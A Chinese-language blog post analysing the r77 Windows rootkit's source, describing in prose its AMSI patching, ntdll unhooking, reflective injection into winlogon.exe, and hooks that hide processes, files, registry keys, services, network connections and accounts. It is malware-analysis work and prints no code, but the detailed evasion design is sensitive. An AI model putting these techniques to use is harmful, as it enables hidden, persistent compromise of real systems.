r77-rootkit源码分析

Exploooosion
2026-03-26
malware › windows

r77rootkit

整体流程

各模块实现

installer

获取自身 .rsrc 段里的 Stager.exe 原始字节并写入注册表 HKLM\SOFTWARE\$77stager中

通过 CreateServiceW创建自启动服务执行powershell命令 cmd.exe /c "powershell.exe -Command ""..."""

具体功能是 patch AmsiScanBuffer 的函数入口，直接让函数返回 0x80070057，然后从 HKLM\SOFTWARE\$77stager 键值中读取数据并在内存中加载，在 EntryPoint处执行

其中会对该powershell脚本做了些混淆：

WriteDummyShellCodeBytes会随机插入一些无实际效果的指令，例如：

  • mov eax, eax
  • mov ebx, ebx
  • add eax, 0
  • sub edx, 0

WriteShellCodeBytes把每个机器码字节写成:

所有用反引号包起来的字符串，比如：

  • `amsi.dll`
  • `AmsiScanBuffer`
  • `kernel32.dll`

会被改写成形如，或其它随机组合：

脚本中的变量名都会被替换成相同长度的随机字符串。

stager

卸载dll挂钩：直接重新读系统文件上的ntdll.dll的文件内容并映射，将其.text节来替换当前进程所加载的ntdll.dll模块所在内存的.text节。

从内嵌资源中读取 Dll32、Dll64、Service32、Service64。对资源做解密和 GZip 解压。把 r77-x86.dll、r77-x64.dll 写入 HKLM\SOFTWARE\$77dll32/$77dll64。把 Service DLL 反射式注入到 winlogon.exe（使用NtCreateThreadEx注入）。

service

service.dll中会先进行unhook（对 winlogon进程加载的所有dll），脱钩会读取系统文件上的dll的文件内容（这里采用间接系统调用的方式），将.text段上的PointerToRawData替换当前的内存映射

打开 HKLM\SOFTWARE，读取 $77dll32、$77dll64。

创建 HKLM\SOFTWARE\$77config，并把 DACL 放宽到普通用户也可写。

启动三个线程：

  • 子进程监听线程：监听 \\.\pipe\$77childproc，管道中读取的内容是子进程的PID，然后会向其注入 $77dll32或 $77dll64，在后续模块里会去hook NtResumeThread这个位于r3层底层的进程创建函数，修改后的逻辑里面会创建对应管道，并写入被创建的子进程PID

  • 新进程轮询线程：每 100ms 枚举一次新进程，与上一次枚举结果比对，对新出现的 PID 回调注入dll

  • 控制管道线程：监听 \\.\pipe\$77control

读取配置里的 startup 项，逐个 ShellExecuteW 启动。

rootkit

真正被注入到各业务进程中的 r77.dll 会做三件事：

  • 写入 R77_SIGNATURE，避免重复注入。
  • 启动配置刷新线程，每秒从注册表重新加载一次配置。
  • 用 Detours 安装一组覆盖面很广的 Hook。

进程隐藏与CPU使用率隐藏

这一类能力由 HookedNtQuerySystemInformation实现。

隐藏进程

当 systemInformationClass == SystemProcessInformation 时，Hook 会遍历 SYSTEM_PROCESS_INFORMATION 链表，当条件项满足时会将当前项从链表中跳过。

隐藏判定条件包括：

  • 进程名带 $77 前缀
  • PID 在配置的 HiddenProcessIds 中
  • 进程名在配置的 HiddenProcessNames 中
隐藏进程 CPU 使用率

同一个 Hook 在另外两个 SystemInformationClass 分支中继续工作：

  • SystemProcessorPerformanceInformation
  • SystemProcessorIdleCycleTimeInformation

在过滤进程链表时，顺手累计隐藏进程的 KernelTime、UserTime、CycleTime，然后把这些时间补到 System Idle Process，还会调用 GetProcessHiddenTimes() 再次显式统计隐藏进程时间。

子进程注入

这一类能力由 HookedNtResumeThread实现。

Hook 先通过线程句柄拿到对应的子进程 PID。判断这是不是当前进程自己的线程；如果是则忽略。

直接调用 InjectDll() 完成注入或者通过 \\.\pipe\$77childproc 把 PID 发给 Service。

文件、目录与命名管道隐藏

这一类能力由 HookedNtQueryDirectoryFile和 HookedNtQueryDirectoryFileEx共同实现。

隐藏判定条件包括：

  • 文件名本身带 $77 前缀
  • 拼接得到的完整路径命中配置中的 HiddenPaths

代码里先判断 GetFileType(fileHandle) == FILE_TYPE_PIPE，如果是 pipe，就把目录路径视为 \\.\pipe\ 然后再把 pipe 名称拼进去，继续走和文件/目录一样的路径隐藏判断。

如果调用者要求返回单项，就循环继续调用原函数，跳过所有隐藏项，直到拿到第一个可见项

如果调用者一次拿到的是多项链表，就对缓冲区逐项检查，并在命中隐藏条件时用 memcpy/memmove 把后面的项整体前移

如果隐藏的是最后一项，就把上一项的 NextEntryOffset 设为 0

注册表隐藏

这由三组 Hook 协同实现：

  • HookedNtQueryKey
  • HookedNtEnumerateKey
  • HookedNtEnumerateValueKey
修正子键数和值数

HookedNtQueryKey 负责保持计数一致性，即使后面的枚举 Hook 会把隐藏项删掉，但如果 NtQueryKey(KeyFullInformation / KeyCachedInformation) 返回的 SubKeys 和 Values 仍然是原始计数，很多工具还是会察觉异常。

隐藏子键

HookedNtEnumerateKey 负责实际过滤注册表子键。

  • 子键名带 $77
  • 完整路径命中 HiddenRegistryPaths
  • 如果当前路径位于 HKLM\SYSTEM\ControlSetXXX\Services，还会额外按 HiddenServiceNames 过滤
隐藏值

HookedNtEnumerateValueKey 负责实际过滤注册表键值。

  • 值名带 $77
  • 完整注册表路径命中 HiddenRegistryPaths

窗口隐藏

这由 HookedNtUserBuildHwndList实现。

让枚举窗口句柄数组的调用者看不到属于隐藏进程的窗口

先调用原始 NtUserBuildHwndList 得到 HWND 数组，遍历每个 HWND用 GetWindowThreadProcessId 找到所属进程，再按以下条件判断该窗口是否应隐藏：

  • PID 在隐藏列表
  • 进程名在隐藏列表
  • 进程名带 $77

命中后用 memmove 把后续 HWND 前移，并递减 itemCount

服务隐藏

这由以下 Hook 共同实现：

  • HookedEnumServicesStatusA
  • HookedEnumServicesStatusW
  • HookedEnumServiceGroupW
  • HookedEnumServicesStatusExA
  • HookedEnumServicesStatusExW
  • HookedEnumServicesStatusExW2

为了覆盖不同程序和不同系统版本：

  • services.msc 会走 EnumServiceGroupW
  • Windows 7 的任务管理器和 Process Hacker 会走 EnumServicesStatusExW
  • Windows 10 某些版本会从 sechost.dll 导出 EnumServicesStatusExW
实现方式

这组 Hook 的结构很一致：

  • 先调用原始服务枚举 API
  • 再把返回的服务数组交给统一 helper 处理：
    • FilterEnumServiceStatusA
    • FilterEnumServiceStatusW
    • FilterEnumServiceStatusProcessA
    • FilterEnumServiceStatusProcessW

这些 helper 会检查：

  • lpServiceName
  • lpDisplayName

只要命中以下条件之一，就把服务条目从数组中删掉：

  • 名称带 $77 前缀
  • 显示名带 $77 前缀
  • 名称命中 HiddenServiceNames
  • 显示名命中 HiddenServiceNames

网络连接隐藏

这由 HookedNtDeviceIoControlFile实现。

当以下条件同时满足时才进入过滤逻辑：

  • ioControlCode == IOCTL_NSI_GETALLPARAM
  • 目标设备对象名是 \Device\Nsi
实现方式

满足条件后，Hook 会把输出缓冲区解释成 NT_NSI_PARAM，然后遍历：

  • TCP 条目表
  • UDP 条目表
  • 可选的进程条目表
  • 可选的状态条目表

过滤条件包括：

  • TCP 本地端口命中 HiddenTcpLocalPorts
  • TCP 远端端口命中 HiddenTcpRemotePorts
  • UDP 端口命中 HiddenUdpPorts
  • 对应 PID 属于隐藏进程
  • 对应进程名属于隐藏进程名
  • 对应进程名带 $77

命中后，不只是删主表项，还会同步移动：

  • entries 表
  • status 表
  • process 表

并递减 Count。

用户账户隐藏

这由 HookedSamEnumerateUsersInDomain和 HookedSamQueryDisplayInformation实现。

其目标是让域用户/本地用户枚举结果里看不到特定账户。

按如下条件判断是否隐藏：

  • 用户名带 $77
  • 用户名命中 HiddenUserNames

AMSI 绕过

这由 HookedAmsiScanBuffer 实现，直接返回固定错误码 0x80070057

这和安装阶段 PowerShell 里直接 patch AmsiScanBuffer 的思想一致。
